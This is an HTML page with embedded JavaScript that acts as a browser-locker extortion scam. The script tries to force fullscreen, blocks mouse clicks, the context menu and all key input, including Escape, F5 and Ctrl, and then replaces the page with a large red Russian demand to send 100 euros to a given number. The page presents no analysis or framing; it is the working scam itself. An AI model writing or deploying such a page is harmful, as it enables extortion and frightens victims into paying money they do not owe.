<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>Document</title>
  </head>
  <body>
    <script>
      //   location.reload();

      function launchFullScreen() {
        if (document.documentElement.requestFullScreen) {
          document.documentElement.requestFullScreen();
        } else if (document.documentElement.mozRequestFullScreen) {
          document.documentElement.mozRequestFullScreen();
        } else if (document.documentElement.webkitRequestFullScreen) {
          document.documentElement.webkitRequestFullScreen();
        }
      }
      document.querySelector("html").onmousedown = e => {
        e.preventDefault();
      };
      document.querySelector("html").onkeydown = e => {
        if (e.keyCode == 27 || e.keyCode == 116 || e.keyCode == 17) {
          e.preventDefault();
          console.log("ss");
        }
        e.preventDefault();
      };
      document.querySelector("html").onkeyup = e => {
        e.preventDefault();
      };
      document.querySelector("html").onkeypress = e => {
        e.preventDefault();
      };
      document.querySelector("html").onclick = e => {
        e.preventDefault();
      };
      document.querySelector("html").oncontextmenu = e => {
        e.preventDefault();
      };

      document.querySelector("html").innerHTML =
        "<p style='text-align: center; font-size: 72px; color: red; text-transform: uppercase'>скидывай 100 евро на 8903405217</p>";
      launchFullScreen();
      //   setTimeout(() => {
      //     location.reload();

    </script>
  </body>
</html>
